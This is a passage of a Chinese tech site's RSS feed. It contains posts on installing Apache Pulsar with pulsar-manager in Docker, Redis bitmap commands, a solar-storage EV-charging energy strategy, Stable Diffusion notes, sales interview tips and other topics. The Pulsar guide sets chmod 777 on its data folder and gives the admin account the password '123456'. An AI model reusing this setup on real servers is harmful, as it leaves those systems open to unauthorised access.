mkdir -p /data/pulsar/data
mkdir -p /data/pulsar/conf# 加权限
chmod 777 /data/pulsar/
3.2. 安装命令：
# 使用zookeeper
docker run -it \
-e PULSAR_STANDALONE_USE_ZOOKEEPER=1 \
-p 6650:6650  \
-p 8080:8080 \
--mount source=pulsardata,target=/pulsar/data \
--mount source=pulsarconf,target=/pulsar/conf \
apachepulsar/pulsar:3.3.2 sh \
-c "bin/apply-config-from-env.py \
conf/standalone.conf &amp;&amp; \
bin/pulsar standalone"
3.3 成功：
3.4 相关命令：
# 进入容器
docker exec -it   xxx你的imageId   /bin/bash
## 1 租户
#查看有哪些租户(public 是系统默认的租户)
pulsar-admin tenants list
##创建租户
pulsar-admin tenants create my-tenant
#删除租户
pulsar-admin tenants delete my-tenant
## 2 命名空间
#查看指定租户下边的命名空间
pulsar-admin namespaces list my-tenant
#创建指定租户命名空间
pulsar-admin namespaces create my-tenant/my-namespace
#删除指定租户命名空间
pulsar-admin namespaces delete my-tenant/my-namespace
4. 安装pulsar-manager
4.1 拉取镜像：
docker pull apachepulsar/pulsar-manager:v0.4.0
4.2 创建镜像
docker run -it -p 9527:9527 -p 7750:7750 -e SPRING_CONFIGURATION_FILE=/pulsar-manager/pulsar-manager/application.properties apachepulsar/pulsar-manager:v0.4.0
4.3 修改密码：
在/opt/pulsar/init.sh 将下方命令复制，并运行。
#!/bin/bash
# 初始化管理员账号CSRF_TOKEN=$(curl http://localhost:7750/pulsar-manager/csrf-token)
curl \-H "X-XSRF-TOKEN: $CSRF_TOKEN" \-H "Cookie: XSRF-TOKEN=$CSRF_TOKEN;" \-H 'Content-Type: application/json' \-X PUT http://localhost:7750/pulsar-manager/users/superuser \-d '{"name": "admin", "password": "123456", "description": "test", "email": "username@test.org"}'
如果上述脚本没用启动成功，则去两个容器查看错误进行解决！可能为容器没用启动成功，或者容器映射没有设置权限等！
4.4 登录：
我在虚拟机创建的，虚拟机ip为51，修改为你的地址进入登录页面
http://192.168.164.51:9527/#/
4.5 设置环境：
4.6: 成功</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540094.html</guid><pubDate>Fri, 31 Oct 2025 07:23:54 +0000</pubDate></item><item><title>闺蜜机为什么会火？</title><link>https://www.ppmy.cn/news/1540095.html</link><description>闺蜜机作为一种集娱乐、学习、健身等多功能于一体的家居设备，近年来逐渐受到消费者的青睐。以下是对闺蜜机的详细介绍：
一、定义与特点
定义：闺蜜机是一种屏幕尺寸介于18~32英寸之间、可触屏、自带支架且支持多个角度调节、底部自带滑轮可移动使用、内置一定容量电池拥有续航能力、拥有独立系统内核及智能操作系统并支持第三方APP安装的家居设备。
特点：
大屏触控：提供更为沉浸式的观影、学习、健身等体验。
灵活移动：底部自带滑轮，可轻松移动至家中任何角落。
角度可调：支架支持多个角度调节，满足不同场景下的使用需求。
续航能力强：内置大容量电池，可脱离充电器使用较长时间。
智能系统：拥有独立系统内核及智能操作系统，支持第三方APP安装，功能丰富多样。
二、功能与用途
娱乐功能：支持高清视频播放、音乐播放、游戏等，成为家庭娱乐中心。
学习功能：可作为学习机使用，支持在线课程、电子书阅读等，助力孩子学习成长。
健身功能：内置摄像头，支持AI健身，可纠正动作、记录健身数据等，成为家庭健身好帮手。
办公功能：支持文档编辑、邮件发送等办公操作，满足家庭办公需求。
社交功能：支持视频通话、远程监控等，拉近与家人、朋友的距离。
三、选购建议
屏幕与画质：优选4K或更高分辨率的屏幕，以获得更为清晰细腻的画质体验。同时，选择防蓝光、防眩光的屏幕材质，以保护视力。
处理器与内存：优选8核处理器及以上，以获得更快的运行速度和处理能力。内存方面，可根据个人需求选择8GB+128GB、8GB+256GB或更高配置的内存组合。
电池续航：选择大容量电池，以满足长时间使用的需求。同时，关注电池的使用寿命和充电速度。
操作系统与APP兼容性：选择搭载最新或稳定版本的操作系统，以确保APP的兼容性和稳定性。同时，关注设备的系统更新政策和服务。
品牌与售后：选择知名品牌和具有良好售后服务的商家，以确保设备的质量和售后服务的可靠性。
四、热门推荐
小度添添闺蜜机：具备智能语音控制、可移动支架、高清大屏等特点，成为家庭娱乐和学习的首选。
海信大白闺蜜机：以长续航、护眼类纸屏、多场景娱乐观影等特点受到消费者喜爱。
KTC闺蜜机Pro：拥有4K超高清屏幕、长续航、触控升降旋转等功能，适合追求高品质观影体验的用户。
易乐看闺蜜机：内置高保真3D环绕音响，支持视频通话和旋转触摸大屏显示器，提供全方位的娱乐体验。
综上所述，闺蜜机以其独特的功能和优势，逐渐成为现代家庭中的必备设备之一。在选购时，可根据个人需求和预算进行选择，以获得最佳的使用体验。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540095.html</guid><pubDate>Fri, 31 Oct 2025 07:23:56 +0000</pubDate></item><item><title>回头看以及向后看</title><link>https://www.ppmy.cn/news/1540096.html</link><description>回头看
昨天看了 大概一百个新生， 看到一百多个新生来了解python，一百多个人里有的可以根据给的相关教程很快的把ide和python解释器安装上，有的就出现了一堆一堆的问题，甚至有的连U盘都不知道怎么用，对着HDMI接口库库使劲，我都心疼它的游戏本了。
好了，就不说这个了，想想我之前的情况，很内向，虽然现在和人说话还是有一点害羞的劲，但是就像凯哥说的一样，我就是我，怎么你了。
向后看
今天看了一下学校的“双选会”，我只能说。。
但是具体了解了之后，发现，这些东西是留给打了两年半游戏的人，而我才刚刚开始我的大二，所以我还是挺有机会取得理想工作，实现人生目标的，欲度人，先度己，欲为诸佛龙象，先为众生牛马。
在这个节点上，我以此留念，作为之后回头看的点。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540096.html</guid><pubDate>Fri, 31 Oct 2025 07:23:58 +0000</pubDate></item><item><title>Redis 数据类型Bitmaps（位图）</title><link>https://www.ppmy.cn/news/1540097.html</link><description>目录
1 基本特性
2 主要操作命令
2.1 SETBIT key offset value
2.2 GETBIT key offset
2.3 BITCOUNT key [start] [end]
2.4 BITOP operation destkey key [key ...]
2.5 BITPOS key bit [start] [end]
3 使用场景
Redis 的位图（Bitmaps）并不是一种独立的数据类型，而是基于字符串（String）数据类型的一种特殊应用。位图允许你将一个字符串视为一系列的二进制位（bit），每个位可以是 0 或 1。通过这种方式，你可以非常高效地处理大量布尔值。
1 基本特性
空间效率：位图使用非常紧凑的存储方式，因为每个位只占用 1 比特。例如，一个包含 1000 万个布尔值的位图只需要大约 1.2 MB 的内存。
原子操作：位图支持原子操作，可以在不锁定整个键的情况下修改单个位。
位级操作：提供了丰富的位级操作命令，如设置、获取和计算位的数量等。
2 主要操作命令
2.1 SETBIT key offset value
设置指定偏移量处的位为
value
（0 或 1）。如果该位不存在，则扩展字符串。
127.0.0.1:6379&gt; setbit bitmap 0 1
(integer) 0
2.2 GETBIT key offset
获取指定偏移量处的位值。
127.0.0.1:6379&gt; getbit bitmap 0
(integer) 1
2.3 BITCOUNT key [start] [end]
计算字符串中被设置为 1 的位的数量。可选参数
start
和
end
用于指定范围。
127.0.0.1:6379&gt; setbit bitmap 0 1
(integer) 0
127.0.0.1:6379&gt; setbit bitmap 1 1
(integer) 0
127.0.0.1:6379&gt; setbit bitmap 2 0
(integer) 0
127.0.0.1:6379&gt; setbit bitmap 3 1
(integer) 0
127.0.0.1:6379&gt; bitcount bitmap
(integer) 3
2.4 BITOP operation destkey key [key ...]
对多个字符串执行位运算，并将结果存储在
destkey
中。支持的操作包括
AND
、
OR
、
XOR
和
NOT
。
AND
操作
：
对所有输入键中的每一位执行按位与操作。
只有当所有输入键在相应位置上的位都为 1 时，结果才为 1。
OR
操作
：
对所有输入键中的每一位执行按位或操作。
只要有一个输入键在相应位置上的位为 1，结果就为 1。
XOR
操作
：
对所有输入键中的每一位执行按位异或操作。
如果输入键在相应位置上的位中有奇数个 1，结果为 1；否则为 0。
NOT
操作
：
对单个输入键中的每一位执行按位非操作。
将每一位取反，1 变为 0，0 变为 1。
假设你有两个位图
bitmap1
和
bitmap2
，并且已经设置了一些位：
127.0.0.1:6379&gt; SETBIT bitmap1 0 1
(integer) 0
127.0.0.1:6379&gt; SETBIT bitmap1 1 0
(integer) 0
127.0.0.1:6379&gt; SETBIT bitmap1 2 1
(integer) 0
127.0.0.1:6379&gt; SETBIT bitmap1 3 1
(integer) 0127.0.0.1:6379&gt; SETBIT bitmap2 0 0
(integer) 0
127.0.0.1:6379&gt; SETBIT bitmap2 1 1
(integer) 0
127.0.0.1:6379&gt; SETBIT bitmap2 2 1
(integer) 0
127.0.0.1:6379&gt; SETBIT bitmap2 3 0
(integer) 0
bitmap1
的二进制表示是
00001011
。
bitmap2
的二进制表示是
00000110。
执行
BITOP AND
操作：
127.0.0.1:6379&gt; BITOP AND result_and bitmap1 bitmap2
(integer) 1
bitmap1
(00001011) AND
bitmap2
(00000110) =
00000010
结果
result_and
的二进制表示为
00000010
。
执行
BITOP OR
操作：
127.0.0.1:6379&gt; BITOP OR result_or bitmap1 bitmap2
(integer) 1
bitmap1
(00001011) OR
bitmap2
(00000110) =
00001111
结果
result_or
的二进制表示为
00001111
。
执行
BITOP XOR
操作：
127.0.0.1:6379&gt; BITOP XOR result_xor bitmap1 bitmap2
(integer) 1
bitmap1
(00001011) XOR
bitmap2
(00000110) =
00001101
结果
result_xor
的二进制表示为
00001101
。
2.5 BITPOS key bit [start] [end]
找到第一个被设置为
bit
（0 或 1）的位的位置。可选参数
start
和
end
用于指定搜索范围。
127.0.0.1:6379&gt; setbit bitmap 0 1
(integer) 0
127.0.0.1:6379&gt; setbit bitmap 1 1
(integer) 0
127.0.0.1:6379&gt; setbit bitmap 2 0
(integer) 0
127.0.0.1:6379&gt; setbit bitmap 3 1
(integer) 0
127.0.0.1:6379&gt; bitpos bitmap 0
(integer) 2
127.0.0.1:6379&gt; bitpos bitmap 1
(integer) 0
更多命令请参考：Commands | Docs
3 使用场景
用户在线状态
：
可以用位图来记录用户的在线状态。例如，每天用一个位图表示所有用户的状态，其中每一位代表一个用户，1 表示在线，0 表示离线。
日活跃用户统计
：
通过位图可以记录每天的活跃用户。每一位代表一个用户，1 表示当天活跃，0 表示不活跃。然后可以通过
BITCOUNT
计算每天的活跃用户数。
权限控制
：
位图可以用来管理用户的权限。每一位可以代表一种权限，1 表示拥有该权限，0 表示没有。
事件跟踪
：
例如，在广告点击追踪中，可以用位图记录哪些用户点击了某个广告。每一位代表一个用户，1 表示点击过，0 表示没有点击。
性能计数器
：
位图可以用来实现高效的计数器。例如，记录每分钟的请求次数，每一位代表一秒钟，1 表示有请求，0 表示没有请求。
IP 地址黑名单/白名单
：
位图可以用来存储 IP 地址黑名单或白名单。每一位代表一个 IP 地址，1 表示禁止访问，0 表示允许访问。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540097.html</guid><pubDate>Fri, 31 Oct 2025 07:24:00 +0000</pubDate></item><item><title>MFC扩展库BCGControlBar Pro v35.1新版亮点：改进网格控件性能</title><link>https://www.ppmy.cn/news/1540098.html</link><description>BCGControlBar库拥有500多个经过全面设计、测试和充分记录的MFC扩展类。 我们的组件可以轻松地集成到您的应用程序中，并为您节省数百个开发和调试时间。
BCGControlBar专业版 v35.1已全新发布了，这个版本改进网格控件的性能、增强工具栏编辑器功能等。
网格和报表控件
1. 当网格(或扩展树控件)具有层次结构时，显著提高了插入大量项的性能。例如，添加1000个条目，每个条目有1000个子条目，现在需要不到2秒的时间(在以前的版本中，这个操作需要几十秒)。现在，您可以创建包含大量项目的网格，并利用过滤器和组等高级功能。
2. CBCGPGridCtrl类的以下方法有一个新的可选参数bUpdateSelection(默认为FALSE)：InsertGroupColumn、RemoveGroupColumn和RemoveGroupColumnByVal，当此参数为TRUE时，更改网格结构后将恢复最近的网格选择。
3. 当网格对多个项执行Clear操作时，框架将为每个静态(不可编辑)网格项调用一个新的虚拟方法CBCGPGridCtrl::OnQueryClearSkipStaticItem。默认情况下，清除操作不会影响静态项，但您可以覆盖此方法以更改此操作。
控件
1. CBCGPTreeCtrlEx：改进了树控件只有一列时的键盘导航；现在导航非常类似于Windows树视图键盘导航。
2. CBCGPTreeCtrlEx：增加LPSTR_TEXTCALLBACK和I_IMAGECALLBACK值支持树项目动态文本标签和图标。
3. CBCGPMultiLinkCtrl：实现类似CLinkCtrl的方法，如SetItem、SetItemID、SetItemUrl、SetItemState、GetItem、GetItemID、GetItemUrl、GetItemState。使用这些方法，您可以指定或检索特定的链接属性，新的类成员m_clrLinkVisited和m_clrLinkDisabled允许您指定已访问和禁用链接的自定义颜色。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540098.html</guid><pubDate>Fri, 31 Oct 2025 07:24:02 +0000</pubDate></item><item><title>智慧光储充一体化能源管理策略</title><link>https://www.ppmy.cn/news/1540099.html</link><description>0引言
我国电动汽车的数量正在持续增长，然而，充电设施的发展却相对滞后，车与充电桩的比例远未达到规划目标。充电桩的建设面临着电网增容困难和盈利模式单一的问题。"光-储-充"一体化设备能够有效解决这些问题，通过夜间储能、日间放电以及光伏发电来降低成本，提高经济效益。目前，现有的能源管理策略主要依赖于优化算法，但这些算法需要进行预测并拥有强大的计算能力，这使得它们并不适用于资源有限的嵌入式系统。本文提出了一种适用于嵌入式系统的光储充能源管理策略。
1智慧光伏储能充电桩架构
智慧光伏储能充电桩由光伏板、储能电池、充电系统和能源管理系统组成。
1.1光伏板
光伏板应安装在光照充足的地方，例如屋顶，并通过DC/DC转换模块连接至直流母线以供电。这种方案直接利用直流系统供电，省去了传统光伏发电中的逆变上网步骤，从而提高了能源转换效率，并实现了“源-荷-储”一体化微电网。
1.2储能电池
充电桩设备对功率和能量密度的要求较高，锂离子电池，尤其是磷酸铁锂电池，凭借其长循环寿命、高效率、出色的热稳定性和安全性，已成为理想的储能解决方案。在“光-储-充”系统中，储能电池连接直流母线以维持电压，并通过功率变换器与电网、光伏系统以及电动汽车进行能量交换。
1.3充电系统
传统的直流充电桩通常通过并联多个交流/直流（AC/DC）转换模块，从市电中获取电力进行供电，并通过控制板来实现充电控制等功能。本系统除了利用AC/DC模块实现快速充电外，还能够通过直流/直流（DC/DC）转换模块，从光伏发电或储能系统中获取电力，为运营商提供一种更为经济的尖峰用电解决方案。
1.4能源管理系统
能源管理系统致力于控制、平衡和优化电网、储能设施以及充电桩的电能供需关系，具备峰谷用电管理和配网增容的应用价值。该系统由本地控制器组成，包括单片机、数字信号处理器（DSP）、可编程逻辑控制器（PLC）等，用于管理功率变换器及其辅助功能，并通过远程通信与云平台相连，以接收指令。本地通信采用RS485、CAN总线以及高压电气隔离技术，以增强抗干扰能力和通信稳定性。远程通信则可选用以太网或LTE接口，便于增加通信主机的种类和数量。
2能源管理策略
能源管理策略的制定基于经济性原则。鉴于系统采用单片机进行控制，其实时计算资源有限，难以执行计算要求较高的算法，例如遗传算法和粒子群优化算法。因此，必须采用资源占用较少且便于编写单片机代码的策略。
2.1模型分析与简化
该模型涉及多个因变量，因此需要简化以降低计算的复杂性。能源的流向和效率主要由各级功率转换模块的平均效率决定，转换环节越多，整体效率越低。在储能侧，由于转换环节较多，转换效率相对较低。在市电向车辆供电时，应优先选择路径a-1-c，以避免净流量同时流经P2和P3线路。根据光储系统的净流量大小，可以分为三种情况：光储净流入、光储净流出以及光储净流出上网或充电。以2号双向功率变换器的实时输出功率为例，这三种情况有助于解决母线功率在2号和3号变换器之间的功率分配问题，从而优化能源管理策略。
2.2储能管理策略
从经济学角度分析，我们需要考虑以下几个因素：
1) 光伏作为一种清洁的可再生能源，其发电过程中没有电价成本，因此应当尽可能地加以利用；
2) 由于峰谷电价差异较大，用电成本随之变化。利用储能电池在谷电时段充电、在尖峰时段放电，不仅可以获得较高的经济效益，还能显著降低充电桩的使用成本。
为了利用光伏发电，光伏功率变换器采用了功率点跟踪（MPPT）控制技术，其输出功率受到实时日照条件的影响，并能够实时测量。电动汽车的用电需求Pc虽然是随机的，但可以被视为已知条件。系统的实时功率状态可以通过控制储能充放电功率Pd或市电联络线功率Pa来求解。储能功率Pd的控制包括待机、快速充放电或慢速充放电模式。为了实现经济效益，储能系统遵循峰谷时段的调整策略，即在谷电时段进行充电，在峰电时段进行放电，并规划充放电的时长。在夜间谷电时段，慢速充电有助于延长电池的使用寿命。储能充放电功率Pd等于规划的充放电量除以规划的充放电时长。
3算例
以下将以安装在华东地区某商业办公园区内的一台智慧充电桩为例，结合前述分析进行规划与计算：
3.1光伏输出功率假设
光伏输出功率参考了华东某地区某晴朗日子里光伏系统的运行数据。
3.2电动汽车负荷
充电桩的负荷难以预测，因为它受到地理位置、用户习惯等多种因素的影响。以多辆非通勤车辆在高峰时段满功率60kW充电为例，设定的充电时间分别为早高峰（9:00-9:30）、午高峰（12:30-13:30）和晚高峰（19:30-20:00）。
3.3储能使用
根据浙江省的分时电价政策，我们制定了相应的储能策略，采用“一天两充、两放”的模式来规划充放电量。为了保护电池的使用寿命，我们将充电量控制在10%至90%的区间，并预留一定的过充和过放空间。鉴于午间低谷时段较短，我们计划在该时段进行40%的补电，而在高峰时段使用40%的电量。根据各个时段的用电和充电量以及持续时间，我们计算出储能系统的功率需求，确保满充电量达到51.2千瓦时(kW·h)。
3.4计算结果
系统依据信息计算得出，光伏系统的峰值发电能力为20千瓦（kW），储能系统在一天内完成两次充电和两次放电，放电倍率约为0.4C，主要集中在夜间19点至21点的高峰用电时段。大功率充电桩的负荷引发了市电网供电的波动，然而，光伏和储能系统的协同作用使得市电需求降低至50千瓦（kW），以满足60千瓦（kW）的车辆充电需求。在经济层面，光伏系统当日的发电量为135千瓦时（kW·h），节省了99.8元的费用；充电桩的充电量为120千瓦时（kW·h），收入161.6元，用户支付的用电成本为101.6元，服务费净收入为60元。光伏和充电桩的总净收入为159.8元。在储能系统参与后，收益增加至204.5元，增长了28%。
4 Acrel-2000MG充电站微电网能量管理系统
4.1平台概述
Acrel-2000MG微电网能量管理系统，由我司自主研发，旨在满足光伏、风力发电、储能系统以及充电站的接入需求。该系统集监控与能量管理功能于一身，基于安全稳定的前提下，致力于实现经济优化运行。它不仅促进可再生能源的广泛应用，提升电网的稳定性，还能够实现需求管理，有效消除峰谷差，提高设备效率，并降低运营成本。系统采用分层分布式结构，涵盖设备层、网络通信层和站控层，并支持多种通信协议。
4.2平台适用场合
系统适用于城市、高速公路、工业园区、工商业区、智能建筑、海岛及无电地区的可再生能源监控和能量管理。
4.3系统架构
本平台的设计采用了分层分布式架构，包括站控层、网络层和设备层。具体的详细拓扑结构如下所示：
典型微电网能量管理系统组网方式
5充电站微电网能量管理系统解决方案
5.1实时监测
微电网能量管理系统的界面设计直观易懂，能够实时展示电气回路的当前状态。系统监测包括光伏、风电、储能和充电站在内的多种电参数，如电压、电流和功率等，并实时监控断路器、隔离开关的状态以及故障信号。此外，该系统还负责管理分布式电源和储能系统，提供发电单元的详细信息、收益情况、荷电状态以及运行功率的设置。对于储能系统，它还执行状态管理，包括荷电状态告警和电池维护。监控界面呈现了微电网的组成、收益、天气情况、节能减排效果、功率、电量以及电压和电流信息，并支持自定义显示充电、储能和光伏系统的相关信息。
系统主界面
子界面包含系统主接线图、光伏、风电、储能、充电站信息，以及通讯状况和统计列表等。
5.1.1光伏界面
光伏系统界面
本界面呈现了光伏系统的详细信息，涵盖了逆变器的运行状态监控、报警机制、发电量的统计与分析、并网柜的实时监测、年有效利用小时数的统计、收益情况、碳减排的统计、环境监测数据、功率模拟以及效率分析。此外，还展示了系统的总功率、电压和电流数据以及逆变器的运行参数。
5.1.2储能界面
储能系统界面
该界面主要用于显示系统的储能容量、当前充放电状态、收益情况，以及SOC和电量变化曲线。
储能系统PCS参数设置界面
本界面用于设置PCS参数，包括开关机、运行模式、功率设定及电压电流限值。
储能系统BMS参数设置界面
本界面用于设置BMS参数，包括电芯电压、温度保护限值、电池组电压、电流和温度限值。
储能系统PCS电网侧数据界面
本界面展示PCS电网侧的相关数据，主要包括相电压、电流、功率、频率、功率因数等指标。
储能系统PCS交流侧数据界面
本界面展示PCS交流侧的数据，主要包括相电压、电流、功率、频率、功率因数、温度值等关键指标。此外，它还能够针对交流侧的异常信息进行实时告警。
储能系统PCS直流侧数据界面
本界面展示PCS直流侧的相关数据，包括电压、电流、功率和电量等关键指标。此外，它还能够对直流侧的异常情况进行实时告警。
储能系统PCS状态界面
本界面展示PCS的状态信息，主要包括通讯状态、运行状态、STS运行状态以及STS故障告警等。
储能电池状态界面
本界面展示BMS（电池管理系统）的状态信息，涵盖储能电池的运行状态、系统信息、数据信息以及告警信息等。同时，它还显示当前储能电池的SOC（电池荷电状态）信息。
储能电池簇运行数据界面
本界面呈现电池簇的详细信息，涵盖各个模组电芯的电压与温度数据，同时展示当前电芯的电压、温度读数及其所在位置。
5.1.3风电界面
风电系统界面
本界面呈现风电系统的详细信息，涵盖逆变控制一体机的直流侧与交流侧运行状态监控及报警功能，逆变器与电站发电量的统计分析，电站年有效利用小时数，发电收益，碳减排量统计，风速、风力及环境温湿度的监测，发电功率模拟与效率分析，以及系统总功率、电压电流和各逆变器运行数据的展示。
5.1.4充电站界面
充电站界面
该界面呈现充电站系统的详细信息，涵盖总功率、交流与直流充电站的功率及电量、费用等关键数据，并展示相关的变化趋势图和实时运行数据。
5.1.5视频监控界面
微电网视频监控界面
本界面主要展示系统接入的视频画面，并通过多样化的配置选项，实现视频的预览、回放、管理及控制功能。
5.1.6发电预测
系统应能够利用历史发电数据、实时数据和天气预报进行短期及超短期的发电功率预测，并展示预测的准确率及误差分析。基于此，用户可以手动或自动地生成发电计划，以实现对新能源发电的集中管理。
光伏预测界面
5.1.7策略配置
系统应能够根据发电数据、储能容量、负荷需求以及电价信息，设定运行模式和控制策略，例如削峰填谷、周期性计划等。这些策略将根据项目的具体情况（如储能柜数量、负载功率、光伏能力等）进行适配和调整，并支持满足定制化需求。
策略配置界面
5.1.8运行报表
应能查询子系统、回路或设备的时间运行参数，报表应展示电参量信息，包括各相电流、三相电压、总功率因数、总有功功率、总无功功率、正向有功电能以及尖峰、平谷时段的电量。
运行报表
5.1.9实时报警
系统必须具备实时报警功能，能够监测子系统中逆变器和双向变流器的启动、关闭等遥信变位，以及设备内部的保护动作或事故跳闸，并及时发出告警。系统应实时显示告警和跳闸事件，包括事件名称和动作时刻，并通过弹窗、声音、短信和电话等多种方式通知相关人员。
实时告警
5.1.10历史事件查询
应能存储和管理遥信变位、保护动作、事故跳闸等事件记录，涵盖电压、电流、功率、功率因数、电芯温度（锂离子电池）、压力（液流电池）、光照、风速、气压越限等信息，以便用户追溯系统事件和报警，进行查询统计和事故分析。
历史事件查询
5.1.11电能质量监测
可对微电网电能质量进行持续监测，包括稳态和暂态状态，以便管理人员实时了解供电情况，及时发现并消除不稳定因素。
1）供电系统主界面应实时展示监测装置的通信状态、电压总畸变率、三相电压不平衡度以及各序电压值，同时显示三相电流不平衡度和各序电流值。
2）电能质量监测：系统应实时呈现三相电压和电流的总谐波畸变率，包括奇次和偶次谐波畸变率，并以柱状图形式展示2-63次及0.5～63.5次间谐波的含有率。
3）电压波动与闪变：系统应展示A/B/C三相电压波动、短闪变、长闪变值，并提供相应的曲线；同时显示电压偏差与频率偏差。
4）功率与电能计量：系统应显示A/B/C三相的有功、无功和视在功率；并展示三相总功率、总功率因素；提供日和年有功负荷曲线。
5）电压暂态监测：在电能质量暂态事件发生时，如电压暂升、暂降或短时中断，系统应发出告警，并通过弹窗、闪烁、声音、短信或电话等方式通知相关人员。同时，系统应允许查看事件发生前后的波形。
6）电能质量数据统计：系统应能显示每分钟统计过去两小时的平均值、MAx、Min、95%概率值和方均根值。
7）事件记录查看功能：事件记录应包括事件名称、状态、波形号、越限值、故障持续时间和发生时间。
微电网系统电能质量界面
5.1.12遥控功能
可以远程操控微电网系统中的设备。维护人员利用主界面执行操作，按照预设、校验、执行的流程，确保及时响应调度或站内指令。
遥控功能
5.1.13曲线查询
在曲线查询界面，您可以直接查看包括三相电流、电压、有功功率、无功功率、功率因数、SOC（状态电荷）、SOH（健康状态）以及充放电电量变化等电参量的曲线。
曲线查询
5.1.14统计报表
该系统支持定时抄表和汇总统计功能，允许用户查询任意时间段内配电节点的发电、用电和充放电数据，包括进线用电量和分支回路消耗的统计分析。同时，它还能分析微电网与外部系统的电能量交换、系统节能和收益情况，以及供电可靠性，包括年停电时间和次数。此外，系统还提供并网型微电网并网点的电能质量分析功能。
统计报表
5.1.15网络拓扑图
系统实时监控设备的通信状态，并展示网络结构；在线诊断故障，自动显示故障设备或元件及其具体部位。
微电网系统拓扑界面
本界面展示微电网系统的拓扑结构，涵盖系统构成要素、电网连接模式、断路器、计量设备等详细信息。
5.1.16通信管理
微电网系统能够有效地管理设备通信、控制以及实时监测数据。维护人员可以通过主程序的右键功能启动通信管理，选择相应的启动端口，从而快速查看设备的通信状态和数据。该系统支持多种通信协议，包括ModbusRTU、ModbusTCP、CDT、IEC60870-5-101、IEC60870-5-103、IEC60870-5-104、MQTT等。
通信管理
5.1.17用户权限管理
应具备设置用户权限管理功能。通过用户权限管理能够防止未经授权的操作（如遥控操作，运行参数修改等）。可以定义不同级别用户的登录名、密码及操作权限，为系统运行、维护、管理提供可靠的安全保障。
用户权限
5.1.18故障录波
在系统发生故障时，它应能够自动记录故障发生前后电气量的变化。这些数据对于事故处理、保护动作的判断以及提高系统安全性至关重要。故障录波器能够记录多达16条信息，每条信息包含6个段落，记录故障前8个周波和后4个周波的波形，总录波时间为46秒。每个采样点至少包含12个模拟量和10个开关量的波形。
故障录波
5.1.19事故追忆
自动记录事故前后的实时数据，包括开关位置、保护状态和遥测量，为事故分析提供坚实的数据基础。用户可以设定触发事故追忆的特定事件，并存储事故前后各10个扫描周期的相关数据点。此外，用户还可以自定义触发事件和监控的数据点。
5.2硬件及其配套产品
6结束语
本文提出了一种针对智慧光伏储能充电桩的简易且高效的实时能源管理策略。通过分析电能的流动路径，采用高效率的传输途径，并充分利用峰谷电价差异，合理规划了在光储多能互补平台下的储能充电管理策略。经过详细的分析和计算，该策略能够有效发挥光伏和储能系统的效能，降低充电桩的运营成本，从而提升其经济效益。
参考文献
【1】路欣怡,刘念,陈征,等.电动汽车光伏充电站的多目标优化调度方法[J].电工技术学报,2014,29(8)：46-56.
【2】罗恒,严晓,王钦,等.充电场站光储充控制策略[J].储能科学与技术,2022,11(1)：275-282.
【3】何国栋，方昌勇，洪凌，邬荣敏，侯鹏，吴鼎.智慧光伏储能充电桩能源管理策略
【4】安科瑞企业微电网设计与应用手册2022.05版.</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540099.html</guid><pubDate>Fri, 31 Oct 2025 07:24:04 +0000</pubDate></item><item><title>stable diffusion系列（1）------概述</title><link>https://www.ppmy.cn/news/1540100.html</link><description>本文是对李宏毅老师的课程的总结，B站链接如下：
stable diffusion(1)概述
讲最经典的DDPM。
1. DDPM图像生成是一个多个step的去噪过程
DDPM是一个从噪声图像中通过不断去噪（经过很多个step），生成图像的过程。
“雕像本来就已经存在石头里，只是把多余的去掉。”
问题是，这么多个step用的是同一个去噪模型吗？是的！！！但是不同的step含有的噪声大小是不一样的，所以，去噪模型还需要知道是哪个step（噪声的大小程度）。
2. 去噪模型内部机制
（1）有一个
噪声预测模型(Noise Predicter)
，输入时带有噪声的图片和当前的step代号，输出是该图片含有的噪声
（2）带有噪声的图片减去预测的噪声
3. 如何训练这个
噪声预测模型
？
这个训练过程肯定需要当前这个step的噪声作为ground truth
这个ground truth其实是自己加的。这需要一个前向加噪的过程（扩散过程）。
4. 把文本加进来
需要图像文本对，LAION图像文本对5.85B
把文本输入到去噪模型中，让模型根据文本去噪。
把文本输入到去噪模型中，实际上也就是输入到
噪声预测模型
中.</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540100.html</guid><pubDate>Fri, 31 Oct 2025 07:24:07 +0000</pubDate></item><item><title>销售面经｜面试沉思录</title><link>https://www.ppmy.cn/news/1540101.html</link><description>面试沉思录
销售业务面/售前业务面：
自信！自信！自信！你能自信那么超过一半人！
1:本科和研究生都是读的计算机，为什么会想要来做销售？是否会有不甘心？
我的回答：1:本科期间是计算机，但是研究生期间稍微有些交叉学科，所以不存在专业上的可惜（我觉得这一点我答得不好！！！）应该改改：两段经历都是计算机能够很好的帮我建立专业知识体系，销售的主要任务是：将产品突出的优点介绍给用户，达成销售的目的，我觉得我有很强的计算机知识，一方面能够让客户觉得我是专业的，从而信任我；另一方面来说，我觉得自己的专业知识能够让我在深层次更加了解公司的产品，从而向用户全面的介绍产品，从用户和公司两个维度出发推荐更合适的产品进行销售。（售前可能不会问这个问题5555）还有另一方面，我觉得职业没有高低贵贱之分，销售干好了不比技术差。。。。应该说点全面的东西，感觉两次面试都遇到这个问题了，我的回答过于逃避了。
2:介绍项目经历：构思语言如何才能够用简单的话术介绍自己的项目！面试官大概率跟我们不是一个专业，所以一定要提前准备这个问题，我在面试时感觉这个题没有表达好，但是还好面试官够宽松，帮我转移话题了。
3:分点作答，首先。。其次。。最后。。或者一方面。。从另一方面。。以及分点作答的时候用总分的形式：比如先给出答案，再展开说为什么给出这个答案，这样会显得非常有条理。
4:失败的事情，如何解决的？收获。这个问题我还在思考，明天问问AI看看他咋说。
本系列持续更新！</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540101.html</guid><pubDate>Fri, 31 Oct 2025 07:24:09 +0000</pubDate></item><item><title>merlion的dashboard打开方法</title><link>https://www.ppmy.cn/news/1540102.html</link><description>安装好
merlion
包后，在
anaconda prompt
中进行如下图操作：
先进入创建好的虚拟环境：
conda activate merlion
再执行命令：
python -m merlion.dashboard
在浏览器中手动打开图中的地址：
http://127.0.0.1:8050
